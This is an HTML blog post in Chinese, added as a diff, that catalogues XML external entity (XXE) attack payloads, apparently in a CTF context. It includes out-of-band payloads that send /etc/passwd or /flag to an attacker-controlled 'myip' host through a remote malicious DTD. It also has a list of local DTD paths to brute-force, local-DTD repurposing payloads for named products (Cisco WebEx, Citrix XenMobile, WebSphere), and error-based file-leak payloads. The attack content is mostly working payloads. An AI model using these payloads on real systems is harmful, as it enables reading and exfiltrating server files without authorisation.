@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        XXE姿势 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">XXE姿势</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/OWASP/" class="post-tag">#OWASP</a>
+  
+    <a href="/tags/XXE/" class="post-tag">#XXE</a>
+  
+
+
+          <span class="post-date">2023-04-01</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#json"><span class="toc-text">json</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="toc-text">数据外带</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0DTD"><span class="toc-text">本地DTD</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99"><span class="toc-text">报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#other"><span class="toc-text">other</span></a></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1at41177SA?spm_id_from=333.337.search-card.all.click&vd_source=dc04d88ab964b9a81d6d774552d69d75">视频</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">文章</a></p>
+<p>注意：内层的定义的参数实体<code>%</code> 需要进行HTML转义，否则会出现解析错误。</p>
+<h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><p>很多有json的地方存在xxe注入，比如下面这样</p>
+<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101715784.webp" alt="image-20230410171542553" style="zoom:67%;" />
+
+<p>可以尝试改成xml形式</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101717327.webp" alt="image-20230410171716122"></p>
+<h1 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h1><p>xxe没有回显，可以想办法把数据带到我们的vps上</p>
+<p>==一：==</p>
+<img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202304101748643.webp" alt="image-20230410174844386" style="zoom:67%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">    %start;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>==二：==</p>
+<p>但是上面的一在内部实体中用了参数实体，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很多网站都是禁止这么使用的，那么我们就可以远程定义一个自己的dtd</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://myip/fuck.dtd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>fuck.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip:10001/?%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+
+<h1 id="本地DTD"><a href="#本地DTD" class="headerlink" title="本地DTD"></a>本地DTD</h1><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？</p>
+<p>所有 XML 实体都是常量。如果定义两个具有相同名称的实体，则只会使用第一个实体。这里相当于对本地的dtd进行重写</p>
+<p>爆破一下常见本地dtd路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./properties/schemas/j2ee/XMLSchema.dtd</span><br><span class="line">./../properties/schemas/j2ee/XMLSchema.dtd</span><br><span class="line">./../../properties/schemas/j2ee/XMLSchema.dtd</span><br><span class="line">/usr/share/java/jsp-api-2.2.jar!/javax/servlet/jsp/resources/jspxml.dtd</span><br><span class="line">/usr/share/java/jsp-api-2.3.jar!/javax/servlet/jsp/resources/jspxml.dtd</span><br><span class="line">/root/usr/share/doc/rh-python34-python-docutils-0.12/docs/ref/docutils.dtd</span><br><span class="line">/root/usr/share/doc/rh-python35-python-docutils-0.12/docs/ref/docutils.dtd</span><br><span class="line">/usr/share/doc/python2-docutils/docs/ref/docutils.dtd</span><br><span class="line">/usr/share/yelp/dtd/docbookx.dtd</span><br><span class="line">/usr/share/xml/fontconfig/fonts.dtd</span><br><span class="line">/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd</span><br><span class="line">/usr/lib64/erlang/lib/docbuilder-0.9.8.11/dtd/application.dtd</span><br><span class="line">/usr/share/boostbook/dtd/1.1/boostbook.dtd</span><br><span class="line">/usr/share/boostbook/dtd/boostbook.dtd</span><br><span class="line">/usr/share/dblatex/schema/dblatex-config.dtd</span><br><span class="line">/usr/share/struts/struts-config_1_0.dtd</span><br><span class="line">/opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Linux</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#x27;Your DTD code&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:WindowsSystem32wbemxmlcim20.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % SuperClass &#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Cisco WebEx</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % url.attribute.set &#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line"></span><br><span class="line">Citrix XenMobile Server</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % Body &#x27;&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line"></span><br><span class="line">多平台 IBM WebSphere 应用</span><br><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;./../../properties/schemas/j2ee/XMLSchema.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xs-datatypes &#x27;Your DTD code&#x27;&gt;</span><br><span class="line">&lt;!ENTITY % simpleType &quot;a&quot;&gt;</span><br><span class="line">&lt;!ENTITY % restriction &quot;b&quot;&gt;</span><br><span class="line">&lt;!ENTITY % boolean &quot;(c)&quot;&gt;</span><br><span class="line">&lt;!ENTITY % URIref &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % XPathExpr &quot;CDATA&quot;&gt;</span><br><span class="line">&lt;!ENTITY % QName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % NCName &quot;NMTOKEN&quot;&gt;</span><br><span class="line">&lt;!ENTITY % nonNegativeInteger &quot;NMTOKEN&quot;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>实例</p>
+<p>假设第一次读取**/flag<strong>实体，第二次把</strong>/flag的里的值<strong>当做实体来读取，明显</strong>/flag的里的值**这个实体不存在，然后就会报错返回，这样就拿到flag了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamsa &#x27;Your DTD code&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">    &amp;#x25;eval;</span><br><span class="line">    &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>ps: 其中，这里已经是三层参数实体嵌套了，第二层嵌套时我们只需要给定义参数实体的<code>%</code>编码，第三层就需要在第二层的基础上将所有<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code> html编码。</strong></p>
+<p>&amp;  &amp;#x26;</p>
+<p>%  &amp;#x25;</p>
+<p>‘  &amp;#x27;</p>
+<p>直观来看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % eval &quot;  &lt;!ENTITY % error SYSTEM &#x27;file:///aaaaa/%file;&#x27;&gt;  &quot;&gt;</span><br><span class="line">    %eval;</span><br><span class="line">    %error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><p>基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http://my-ip/fuck.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+<p>fuck.dtd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>本地dtd+报错连用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message[</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///aaaaa/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">    &amp;#x25;eval;</span><br><span class="line">    &amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="other"><a href="#other" class="headerlink" title="other"></a>other</h1><p>我发现，虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2 2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/04/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0bypass/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>文件上传bypass</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/04/01/XXE%E5%9F%BA%E7%A1%80/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      XXE基础
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
